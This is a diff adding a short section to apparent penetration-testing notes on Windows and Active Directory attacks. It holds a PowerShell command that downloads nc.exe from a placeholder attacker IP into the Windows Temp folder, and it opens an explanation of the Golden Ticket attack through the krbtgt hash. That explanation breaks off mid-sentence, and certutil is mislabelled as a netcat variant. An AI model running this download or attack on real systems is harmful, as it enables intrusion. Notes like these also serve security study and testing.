@@ -1,0 +1,15 @@
+# Windows Machine {-}
+
+certutil.exe -> netcat variant for Windows
+
+```bash
+powershell -c iwr -uri http://<attacker_ip>/<file_to_download> -OutFile C:\Windows\Temp\nc.exe
+```
+
+## Active Directory {-}
+
+### Golden Ticket Attack {-}
+
+The goal of this attack is to generate a Ticket Granted Ticket. For this attack you thenneed to recover the hash of the **krbtgt** user that is the one who 
+can create those tickets
+
